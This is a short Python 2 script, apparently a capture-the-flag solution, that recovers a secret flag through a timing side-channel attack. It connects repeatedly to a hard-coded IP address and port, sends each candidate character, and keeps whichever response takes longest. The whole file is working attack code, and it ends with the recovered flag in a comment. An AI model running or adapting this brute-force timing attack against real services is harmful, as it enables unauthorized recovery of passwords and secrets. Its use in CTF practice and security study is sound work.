#!/usr/bin/env python
import time
import socket
import re
import sys

timer = time.clock if sys.platform == 'win32' else time.time


host="54.167.134.245"
#the port with whatever u want 
port = 5866
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#default alues
flag = "";
highestTime = 0;
attempt= ""

allowedChars = "abcdegfhijklmnopqrstuvwxyz-0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()"



for x in range(0,50):
	# Resets highestChar
	highestChar=""
	for x in allowedChars:
		#Creates attempt 1
		attempt = flag + x
		#Create socket
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		#Start timer
		start = timer()
		#Connect to netcat
		s.connect((host, port))
		#Recover response
		data2 = s.recv(1024)
		print data2
		#Send flag
		print "Attempting: " + attempt
		s.send(attempt + '\n')
		#keep this to get the actual response
		data2 = s.recv(1024)
		#End timer
		time1 = timer()-start
		print "Time 1: " + str(time1)
		# print 'time taken ', timer()-start ,' seconds'
		if (timer()-start > highestTime):
			highestTime = timer()-start
			highestChar = x
		s.close()
		#attempt 2
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		start = timer()
		s.connect((host, port))
		data2 = s.recv(1024)
		s.send(attempt + '\n')
		#keep this to get the actual response
		data2 = s.recv(1024)
		time2 = timer()-start
		print "Time 2: " + str(time2)
		# print 'time taken ', timer()-start ,' seconds'
		average = (time1+time2)/2
		print "Average: " + str(average)
		if (average > highestTime):
			highestTime = average
			highestChar = x
		s.close()
	print "Adding [" + highestChar + "] to flag"
	flag = flag + highestChar;
	print "Current Flag: " + flag

#RC3-2016-itz-alw4yz-a-g00d-t1m1ng-@tt@ck